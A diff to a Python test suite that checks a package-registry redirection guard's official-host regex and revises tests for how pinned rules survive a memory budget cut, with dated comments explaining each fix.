+# every OFFICIAL host was reported as a redirection. Four of twenty cases, all in the silent half.
+# Pinned as its own question because a table of cases passing says nothing about why it passes.
+check("the official-host list is a working regex, not one that matches nothing",
+      _g149._OFFICIAL.count("\\\\") == 0 and "rubygems\\.org" in _g149._OFFICIAL)
+
+# 🐛 The separator sat outside the lookahead as `\\s*["']?`, and `\\s*` can give back what it took:
+# the lookahead was applied at the space after `index-url =`, where the text does not begin with a
+# scheme, so it succeeded. Whitespace that a lookahead depends on belongs inside it.
+check("...and the separator cannot be surrendered back to make the lookahead succeed",
+      _g149._OFFICIAL.startswith("(?!\\s*"))
+
+# It advises. `--strict` is where a project says it should fail instead, and that is the only way
+# a commit is ever stopped by this.
+_src149 = _guard_path149.read_text(encoding="utf-8")
+check("...and a supply finding warns rather than blocking, unless --strict was asked for",
+      "This is a WARNING and the commit proceeds" in _src149
+      and "return 1 if strict else 0" in _src149)
 # ---- 14_pinned_rule_survives.py
 # 🐛 [2026-09-09] Rules were ordered newest-first, which is a fair tie-break and a poor importance
 # signal. Measured, not argued: `the-set-not-the-member.md` records this repository's most-repeated
@@ -30275,7 +30831,12 @@ check("a pinned rule arrives with its body however many rules crowd it",
 
 # Without the pin the same rule is the oldest and does NOT survive — which is what makes the check
 # above mean something rather than passing by accident.
-_d = _store(20, pin_index=None)
+# 🐛 [2026-09-15] This fixture stopped exercising the cut. The rules budget now rises to
+# whatever NAMING every rule costs — a rule the session never sees cannot be called on when
+# it applies — so twenty rules all fit and the branch under test never ran. The fixture is
+# scaled past the runaway guard (`memory.RULES_RUNAWAY_SHARE` of the output ceiling, about
+# thirty-eight rules at the shipped default) so the cut still happens and is still tested.
+_d = _store(60, pin_index=None)
 try:
     _fitted, _title_only, _c, _b = memory_mod.rules_pressure(_d)
     check("...and the same rule unpinned is not privileged", "Rule 0" in _title_only,
@@ -30393,7 +30954,12 @@ check("a pinned entry survives the cut in every store that cuts, not just rules"
 # budget quietly stops being a budget.
 _t_nocut = []
 for _kind in ("decisions", "lessons", "rules", "milestones", "threads"):
-    _root = _t_ws(_kind, 22, pin_at=None)
+    # 🐛 [2026-09-15] This fixture stopped exercising the cut. The rules budget now rises to
+# whatever NAMING every rule costs — a rule the session never sees cannot be called on when
+# it applies — so twenty-two entries all fit and the branch under test never ran. The fixture is
+# scaled past the runaway guard (`memory.RULES_RUNAWAY_SHARE` of the output ceiling, about
+# thirty-eight rules at the shipped default) so the cut still happens and is still tested.
+    _root = _t_ws(_kind, 60, pin_at=None)
     try:
         _text = _t_shown(_kind, _root)
         if all(f"{_t_NAME[_kind]} {_i}" in _text for _i in range(22)):
@@ -32297,15 +32863,36 @@ for _t_n in (4, 6, 8, 10, 14):
             _at = _text.find(f"Rule {_i}")
             if _at < 0:
                 continue
+            # 🐛 [2026-09-15] The LAST rule had no "\n\n**" after it, so it was measured to the end
+            # of the text -- which includes the section's own "…more rules in …" tail, about 300
+            # characters of chamnan's words counted as that rule's share. It inflated exactly one
+            # rule in every fixture, and the check passed only because the pin used to be large
+            # enough to beat the inflated number anyway. The tail is where a rule stops.
             _end = _text.find("\n\n**", _at + 8)
+            _tail_at = _text.find("\n\n_…more rules", _at + 8)
+            for _stop in (_end, _tail_at):
+                if _stop > 0 and (_end <= 0 or _stop < _end):
+                    _end = _stop
             _got[_i] = len(_text[_at:_end if _end > 0 else len(_text)])
         if 0 in _got and len(_got) > 1:
             _others = [v for k, v in _got.items() if k != 0]
-            if _others and _got[0] <= max(_others):
+            # 🐛 [2026-09-15] Delivered CHARACTERS was a proxy for "the pin was not short-changed",
+            # and the proxy gained a false positive the day pins started being delivered WHOLE: a
+            # pinned rule shorter than its neighbours arrives complete at 191 characters while a
+            # longer unpinned one is trimmed to 394, and the pin is plainly better off. The recorded
+            # intent (R9 agent 6) is that a pin must not be CUT — "giving it the same slice as the
+            # rest honours the ordering and not the intent" — so that is what is asserted now.
+            #
+            # Strictly stronger, not weaker: a pin that IS cut must still out-measure every
+            # unpinned rule, which is the whole of what this checked before.
+            _r0 = _text.find("Rule 0")
+            _r0e = _text.find("\n\n**", _r0 + 8)
+            _whole0 = "the rest is in" not in _text[_r0:_r0e if _r0e > 0 else len(_text)]
+            if _others and not _whole0 and _got[0] <= max(_others):
                 _t_equal39.append(f"{_t_n} rules: pinned got {_got[0]}, largest other {max(_others)}")
     finally:
         shutil.rmtree(_d, ignore_errors=True)
-check("a pinned rule is given a larger share than an unpinned one, not merely a better place",
+check("a pinned rule is delivered whole, or given a larger share than any unpinned one",
       not _t_equal39, saw="\n".join(_t_equal39) or None)
 
 # It must not become an exemption. The other rules still have to arrive — starving nine to feed one
